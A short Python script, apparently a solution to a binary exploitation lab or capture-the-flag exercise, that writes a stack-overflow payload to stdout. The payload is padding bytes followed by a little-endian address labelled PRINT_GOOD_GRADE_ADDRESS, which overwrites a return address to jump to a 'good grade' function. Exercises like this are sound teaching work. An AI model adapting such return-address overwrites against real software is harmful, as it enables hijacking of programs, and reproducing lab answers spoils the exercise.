#!/usr/bin/env python3

import sys

PRINT_GOOD_GRADE_ADDRESS = 0x401e46

p = b'A' * 4
p += b'C' * 8
p += PRINT_GOOD_GRADE_ADDRESS.to_bytes(8, 'little')

sys.stdout.buffer.write(p)